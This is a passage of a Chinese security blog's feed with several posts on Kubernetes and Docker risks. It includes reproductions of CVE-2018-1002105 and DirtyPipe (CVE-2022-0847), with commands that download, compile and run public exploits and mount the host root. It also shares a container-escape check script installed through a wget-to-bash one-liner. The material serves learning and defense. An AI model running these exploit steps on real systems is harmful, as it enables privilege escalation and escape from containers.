class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify exec <span class="token punctuation">-</span>it test <span class="token punctuation">-</span>n test /bin/hostnamekubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>token=password <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>insecure<span class="token punctuation">-</span>skip<span class="token punctuation">-</span>tls<span class="token punctuation">-</span>verify get pods <span class="token punctuation">-</span>n kube<span class="token punctuation">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果显示能够对指定 Pod 执行命令，但是不能执行其他越权操作，符合预期场景。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628124.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用脚本获得高权限凭证文件，脚本地址：<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">python3 exploit.py <span class="token punctuation">-</span><span class="token punctuation">-</span>target 172.16.214.18 <span class="token punctuation">-</span><span class="token punctuation">-</span>port 6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>bearer<span class="token punctuation">-</span>token password <span class="token punctuation">-</span><span class="token punctuation">-</span>namespace test <span class="token punctuation">-</span><span class="token punctuation">-</span>pod test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628455.png"></p><p>接着，使用拿到的高权限凭证在集群中新建一个挂载了宿主机根目录的 Pod，yaml 文件地址：<a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/attacker.yaml</a></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key apply <span class="token punctuation">-</span>f attacker.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Pod 被成功创建后，执行 ls /host-escape-door 命令可成功看到宿主机下的文件。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl <span class="token punctuation">-</span><span class="token punctuation">-</span>server=https<span class="token punctuation">:</span>//172.16.214.18<span class="token punctuation">:</span>6443 <span class="token punctuation">-</span><span class="token punctuation">-</span>certificate<span class="token punctuation">-</span>authority=./ca.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>certificate=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.crt <span class="token punctuation">-</span><span class="token punctuation">-</span>client<span class="token punctuation">-</span>key=./apiserver<span class="token punctuation">-</span>kubelet<span class="token punctuation">-</span>client.key exec attacker ls /host<span class="token punctuation">-</span>escape<span class="token punctuation">-</span>door<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629440.png"></p><p>至此，完成了 CVE-2018-1002015 漏洞的复现。</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>该漏洞的修复也比较简单，直接在 API Server 中增加对后端服务器返回值的判断即可。</p><p>在新版 k8s 中的 tryUpgrade 函数这里，会判断状态码是否等于 http.StatusSwitchingProtocols，即 101，如果状态码不等于 101，则关闭连接。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241629620.png"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考资料：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://xz.aliyun.com/t/3542">https://xz.aliyun.com/t/3542</a></p><p><a href="https://zh.wikipedia.org/wiki/WebSocket">https://zh.wikipedia.org/wiki/WebSocket</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】k8s 所面临的风险学习</title>
    <link href="https://www.teamssix.com/220321-185825.html"/>
    <id>https://www.teamssix.com/220321-185825.html</id>
    <published>2022-03-21T10:58:25.000Z</published>
    <updated>2022-03-21T11:11:51.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台，以下是 k8s 架构图。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203211854408.png"></p><p>k8s 主要由以下核心组件组成：</p><ul><li>etcd 保存了整个集群的状态</li><li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制</li><li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等</li><li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上</li><li>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理</li><li>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI）</li><li>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡</li></ul><p>这里学习下 k8s 中所面临的一些风险，主要有 5 个部分：</p><p>1、容器基础设施存在的风险</p><p>2、组件接口存在的风险</p><p>3、集群网络存在的风险</p><p>4、访问控制机制存在的风险</p><p>5、自身的漏洞</p><p>其中容器基础设施存在的风险和之前分享的基本一致，这里主要看剩下的四种。</p><h1 id="0x01-组件接口存在的风险"><a href="#0x01-组件接口存在的风险" class="headerlink" title="0x01 组件接口存在的风险"></a>0x01 组件接口存在的风险</h1><h2 id="1、API-Server"><a href="#1、API-Server" class="headerlink" title="1、API Server"></a>1、API Server</h2><p>API Server 默认服务端口为 8080 和 6443，8080 端口提供 HTTP 服务，没有认证与授权机制，而 6443 提供 HTTP 服务，支持认证和授权服务。</p><p>默认情况下 8080 端口不启动，但如果用户开启了该服务，就会造成 API Server 的未授权访问，从而控制整个集群。</p><h2 id="2、Kubelet"><a href="#2、Kubelet" class="headerlink" title="2、Kubelet"></a>2、Kubelet</h2><p>与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248</p><p>Kubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。</p><h2 id="3、Dashboard"><a href="#3、Dashboard" class="headerlink" title="3、Dashboard"></a>3、Dashboard</h2><p>Dashboard 默认端口为  8001，从 1.10.1 版本起，Dashboard 默认禁用了跳过按钮，但如果用户为了方便或者其他原因，开启了相关功能，就会导致 Dashboard 的未授权访问。</p><h2 id="4、etcd"><a href="#4、etcd" class="headerlink" title="4、etcd"></a>4、etcd</h2><p>etcd 默认监听 2379、2380 端口，前者用于客户端连接，后者用于多个 etcd 实例之间的通信。</p><p>默认情况下，etcd 提供的两个端口都需要相应的证书才能访问，但如果 RT 窃取了证书，或者用户将 etcd 设置了允许匿名问，那么 RT 就可以直接访问 etcd 并窃取数据。</p><p>由于 Kubernetes 集群内部的各种资源及其状态都存在 etcd 中，因此如果可以读取 etcd 的数据，就可能获得高权限，从而控制集群。</p><h1 id="0x03-集群网络存在的风险"><a href="#0x03-集群网络存在的风险" class="headerlink" title="0x03 集群网络存在的风险"></a>0x03 集群网络存在的风险</h1><p>Pod 是由一个或多个容器构成的集合，在没有其他网络隔离策略和 Pod 安全策略的默认情况下，由于 Pod 与 Pod 之间可以联通，且 Pod 内的 root 用户具有 CAP_NET_RAW 权限（即允许使用原始套接字的权限），因此集群内部可能会发生内网横向的风险。</p><h1 id="0x04-访问控制机制存在的风险"><a href="#0x04-访问控制机制存在的风险" class="headerlink" title="0x04 访问控制机制存在的风险"></a>0x04 访问控制机制存在的风险</h1><p>Kubernetes 中的访问控制机制主要由认证机制、授权机制和准入机制三个部分组成。</p><p>如果访问控制比较宽松或混乱或者允许 Kubernetes 的未授权访问，RT 可能借此直接获得集群管理员权限。</p><h1 id="0x05-无法根治的软件漏洞"><a href="#0x05-无法根治的软件漏洞" class="headerlink" title="0x05 无法根治的软件漏洞"></a>0x05 无法根治的软件漏洞</h1><p>Kubernetes 自身也被爆出许多安全漏洞，这类自然也属于 Kubernetes 所面临的的风险。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考资料：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://www.jianshu.com/p/a7f6c4f420fa">https://www.jianshu.com/p/a7f6c4f420fa</a></p><p><a href="https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/">https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/</a></p><p><a href="https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84">https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt; 以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;head</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="k8s" scheme="https://www.teamssix.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一个检测容器逃逸的脚本</title>
    <link href="https://www.teamssix.com/220318-164446.html"/>
    <id>https://www.teamssix.com/220318-164446.html</id>
    <published>2022-03-18T08:44:46.000Z</published>
    <updated>2022-03-18T09:03:35.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：</p><ol><li>处于特权模式</li><li>挂载了 Docker Socket</li><li>挂载了 Procfs</li><li>挂载了宿主机根目录</li><li>开启了 Docker 远程 API 访问接口</li><li>CVE-2016-5195 DirtyCow 脏牛漏洞</li><li>CVE-2020-14386 </li><li>CVE-2022-0847 DirtyPipe</li></ol><p>项目地址：<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><p>感觉还不错的师傅们可以点个小星星 🌟</p><p>对于检测的原理可以看我写的这篇文章：<a href="https://zone.huoxian.cn/d/990">https://zone.huoxian.cn/d/990</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>在 Docker 容器中一键运行：</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teamssix&#x2F;container-escape-check&#x2F;main&#x2F;container-escape-check.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者克隆项目到容器中运行：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;container-escape-check.gitcd container-escape-checkchmod +x container-escape-check.sh.&#x2F;container-escape-check.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203181518954.png"></p><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul><li>这个脚本需要在 Docker 容器中运行</li><li>这里的检测方法大多是基于我自己的经验，可能会存在检测误检或者漏检的情况，如果您发现了这种情况，欢迎提 Issue</li><li>由于有的逃逸方法需要根据目标 Docker 的版本去判断，这里我暂时还没想到从容器内部获取 Docker 版本的方法，因此脚本暂时还不支持这块儿的检测。</li></ul><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;处于特权模式&lt;/li&gt;
&lt;li&gt;挂载了</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
    <category term="容器逃逸" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】DirtyPipe CVE-2022-0847 Linux 内核提权漏洞复现</title>
    <link href="https://www.teamssix.com/220308-120008.html"/>
    <id>https://www.teamssix.com/220308-120008.html</id>
    <published>2022-03-08T04:00:08.000Z</published>
    <updated>2022-03-08T08:19:12.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CVSS 评分：7.8</p><p>影响范围：5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p><p>RT 通过 CVE-2022-0847 可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root</p><p>这个漏洞作者将其命名为了 Dirty Pipe，一看到这名字讲道理就让人想到了 Dirty Cow，这是因为该漏洞的原理比较类似于 Dirty Cow，但这个漏洞更容易被利用。</p><h1 id="0x01-漏洞检测"><a href="#0x01-漏洞检测" class="headerlink" title="0x01 漏洞检测"></a>0x01 漏洞检测</h1><p>检测的方法很简单，直接 uname -r ，如果  5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102 说明可能受到该漏洞的影响。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203032.png" alt="img"></p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><blockquote><p>建议在搭建环境前，先打好快照</p></blockquote><p>环境依赖：</p><ul><li>Ubuntu 16.04 或 18.04（推荐）</li><li>Python &gt;= 3.6 (不支持Python 2.x！)</li><li>pip3</li></ul><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brant-ruan&#x2F;metarget.gitcd metarget&#x2F;pip3 install -r requirements.txtsudo .&#x2F;metarget cnv install cve-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202460.png" alt="img"></p><p>环境搭建好后，查看当前系统内核</p><pre class="line-numbers language-none"><code class="language-none">uname -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202399.png" alt="img"></p><p>可以看到系统内核已经是 5.8 的了，说明是可能受到该漏洞的影响了。</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="方法一：CVE-2022-0847-DirtyPipe-Exploit"><a href="#方法一：CVE-2022-0847-DirtyPipe-Exploit" class="headerlink" title="方法一：CVE-2022-0847-DirtyPipe-Exploit"></a>方法一：CVE-2022-0847-DirtyPipe-Exploit</h2><p>把 POC git 下来</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploitcd CVE-2022-0847-DirtyPipe-Exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开始提权</p><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit.&#x2F;exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203539.png" alt="img"></p><p>我这里提示 su: must be run from a terminal，没提权成功。</p><p>根据作者的解释，他的电脑快没电了，所以暂时还没时间解决这个问题，这 ……</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203449.png" alt="img"></p><h2 id="方法二：dirtypipez-c"><a href="#方法二：dirtypipez-c" class="headerlink" title="方法二：dirtypipez.c"></a>方法二：dirtypipez.c</h2><p>后来看 p 牛说到了网上的其他 POC，下面这个 POC 测试了一下，是可以提权的</p><pre class="line-numbers language-none"><code class="language-none">mkdir dirtypipezcd dirtypipezwget https:&#x2F;&#x2F;haxx.in&#x2F;files&#x2F;dirtypipez.cgcc dirtypipez.c -o dirtypipez<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203441.png" alt="img"></p><p>这个 POC 需要事先找到一个具有 SUID 权限的可执行文件，然后利用这个文件进行提权</p><p>使用以下命令可以找到这类文件</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204857.png" alt="img"></p><p>这里就以 /bin/su 为例了，直接 ./dirtypipez 跟上具有 SUID 权限的文件即可提权</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;dirtypipez &#x2F;bin&#x2F;su <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204783.png" alt="img"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>更新升级 Linux 内核到以下安全版本：</p><ul><li>Linux 内核 &gt;= 5.16.11</li><li>Linux 内核 &gt;= 5.15.25</li><li>Linux 内核 &gt;= 5.10.102</li></ul><blockquote><p>参考文章：</p><p><a href="https://t.zsxq.com/imaqj2V">https://t.zsxq.com/imaqj2V</a></p><p><a href="https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw">https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw</a></p><p><a href="https://access.redhat.com/security/cve/cve-2022-0847">https://access.redhat.com/security/cve/cve-2022-0847</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;CVSS 评分：7.8&lt;/p&gt;
&lt;p&gt;影响范围：5.8 &amp;lt;= Linux 内核版本 &amp;lt; </summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Linux" scheme="https://www.teamssix.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】容器基础设施所面临的风险学习</title>
    <link href="https://www.teamssix.com/220307-162000.html"/>
    <id>https://www.teamssix.com/220307-162000.html</id>
    <published>2022-03-07T08:20:00.000Z</published>
    <updated>2022-03-07T08:29:22.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这里以 Docker 为例，来学习学习容器基础设施中存在的一些风险问题。</p><p>下图是 Docker 官方给出的架构图，里面包括了 Docker 客户端、Docker 容器所在的宿主机和 Docker 镜像仓库三个部分。</p><p>其中宿主机包括了 Docker 守护进程、本地容器和本地镜像，Docker 守护进程（dockerd）的作用是侦听 Docker API 请求和管理 Docker 对象。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618942.png"></p><h1 id="0x01-容器镜像存在的风险"><a href="#0x01-容器镜像存在的风险" class="headerlink" title="0x01 容器镜像存在的风险"></a>0x01 容器镜像存在的风险</h1><h2 id="1、不安全的第三方组件"><a href="#1、不安全的第三方组件" class="headerlink" title="1、不安全的第三方组件"></a>1、不安全的第三方组件</h2><p>例如开发者在代码中引入了存在漏洞版本的 log4j2 组件，然后将其打包成了业务镜像。这样即使代码没有漏洞，但因为引入了不安全的第三方组件也变得有漏洞了。</p><p>再比如开发者在 Django 镜像的基础上，编写了自己的 Python 代码，然后将其打包成镜像。这样如果在  Django 镜像里引用了不安全的第三方组件或者 Django 自身存在漏洞，自己打包的镜像也同样会受到影响。</p><h2 id="2、不安全的镜像"><a href="#2、不安全的镜像" class="headerlink" title="2、不安全的镜像"></a>2、不安全的镜像</h2><p>在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了。</p><h2 id="3、敏感信息泄露"><a href="#3、敏感信息泄露" class="headerlink" title="3、敏感信息泄露"></a>3、敏感信息泄露</h2><p>如果开发者为了开发、调试方便，可能会将数据库账号密码、云服务密钥之类的敏感数据打包到了镜像里，那别人获取到这个镜像后，就会导致敏感信息泄露了。</p><h1 id="0x02-活动中的容器存在的风险"><a href="#0x02-活动中的容器存在的风险" class="headerlink" title="0x02 活动中的容器存在的风险"></a>0x02 活动中的容器存在的风险</h1><h2 id="1、不安全的容器应用"><a href="#1、不安全的容器应用" class="headerlink" title="1、不安全的容器应用"></a>1、不安全的容器应用</h2><p>在使用容器时，往往会需要进行端口映射，比如把 MySQL 的 3306 端口映射出来，如果 MySQL 被配置了弱密码，那就存在被利用的风险了。</p><p>除此之外，如果一个 Web 服务端口被映射出来，同时这个 Web 服务存在漏洞，那么也同样是存在风险的。</p><h2 id="2、不受限制的资源共享"><a href="#2、不受限制的资源共享" class="headerlink" title="2、不受限制的资源共享"></a>2、不受限制的资源共享</h2><p>容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险。</p><h2 id="3、不安全的配置与挂载"><a href="#3、不安全的配置与挂载" class="headerlink" title="3、不安全的配置与挂载"></a>3、不安全的配置与挂载</h2><p>如果为容器设定了不安全的配置，会导致容器本身的隔离机制失效，容器的两大隔离机制如下：</p><ul><li>Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</li><li>Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</li></ul><p>如果设定了以下配置就会导致相应的隔离机制失效：</p><ul><li><p>–privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</p></li><li><p>–net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</p></li><li><p>–pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</p></li><li><p>–volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</p></li></ul><h1 id="0x03-容器管理程序接口的风险"><a href="#0x03-容器管理程序接口的风险" class="headerlink" title="0x03 容器管理程序接口的风险"></a>0x03 容器管理程序接口的风险</h1><p>Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket</p><h2 id="1、UNIX-socket"><a href="#1、UNIX-socket" class="headerlink" title="1、UNIX socket"></a>1、UNIX socket</h2><p>UNIX socket 的风险主要在于 Docker 守护进程默认以宿主机的 root 权限运行，因此就可以借助这点进行提权或者容器逃逸。</p><p>这类风险主要有两个利用场景：</p><ul><li>普通用户被加到 Docker 用户组内</li></ul><p>如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限。</p><p>具体的做法可以简单描述为：使用普通用户创建一个 privileged 为 true 的容器，在该容器内挂载宿主机硬盘并写入定时任务，然后将宿主机的 root 权限反弹回来，后期将详细介绍这种方法的使用。</p><ul><li>UNIX socket 挂载到容器内部</li></ul><p>有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，RT 就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限。 </p><h2 id="2、TCP-socket"><a href="#2、TCP-socket" class="headerlink" title="2、TCP socket"></a>2、TCP socket</h2><p>现在 Docker 守护进程默认不会监听 TCP socket，不过有时可能用户会因为方便开启 TCP socket 的监听，一般默认监听端口是 2375</p><p>默认情况下，Docker 守护进程 TCP socket 是无加密无认证的，因此如果发现宿主机 Docker 开放了 TCP socket，就可以直接使用 docker -H 接管目标的容器</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618407.png"></p><h1 id="0x04-其他风险"><a href="#0x04-其他风险" class="headerlink" title="0x04 其他风险"></a>0x04 其他风险</h1><h2 id="1、容器网络风险"><a href="#1、容器网络风险" class="headerlink" title="1、容器网络风险"></a>1、容器网络风险</h2><p>虽然默认情况下，容器内部的网络与宿主机是隔离的，但是每个容器之间是彼此互相连通的，理论上在容器之间是存在内网横向的风险的。</p><h2 id="2、宿主机操作系统风险"><a href="#2、宿主机操作系统风险" class="headerlink" title="2、宿主机操作系统风险"></a>2、宿主机操作系统风险</h2><p>容器通常与宿主机共享内核，也就是说如果宿主机内核存在漏洞，意味着容器可能也会存在相同的漏洞。</p><p>例如如果宿主机存在脏牛漏洞，那么拿到容器权限后，使用脏牛漏洞就可以获得宿主机权限，实现容器逃逸。</p><h2 id="3、软件自身的漏洞"><a href="#3、软件自身的漏洞" class="headerlink" title="3、软件自身的漏洞"></a>3、软件自身的漏洞</h2><p>Docker 自身存在的一些漏洞，比如 CVE-2019-14271、CVE-2019-5736 等都可以导致容器逃逸，这些也都是风险点，后面会对这些漏洞进行尝试复现。</p><blockquote><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p><p> 参考资料：</p><p> 